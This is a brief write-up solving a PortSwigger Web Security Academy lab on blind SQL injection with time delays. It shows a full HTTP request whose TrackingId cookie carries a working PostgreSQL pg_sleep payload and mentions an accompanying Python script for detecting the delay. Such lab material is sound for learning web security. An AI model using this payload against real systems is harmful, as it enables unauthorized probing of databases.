# Manual Solution Using Burp Suite Community

## Lab

**Blind SQL injection with time delays**

> **Note:** Replace the lab URL below with your own PortSwigger Web Security Academy lab instance.

### Request

```http
GET /product?productId=9 HTTP/2
Host: 0ac0006d048cf96c809e62e400a40052.web-security-academy.net
Cookie: TrackingId=x'||pg_sleep(10)--; session=<your-session-cookie>
```

### Injection Point

```text
TrackingId
```

### Payload

```sql
x'||pg_sleep(10)--
```

### Result

Modify the `TrackingId` cookie with the payload above and forward the request.

If the response is delayed by approximately **10 seconds**, the SQL injection is successful and the lab is solved.

---

## Python Implementation

The accompanying Python script:

- Sends a request with the SQL injection payload in the `TrackingId` cookie.
- Measures the response time.
- Reports whether a time delay was detected.

```text
blind-time-delays.py
```
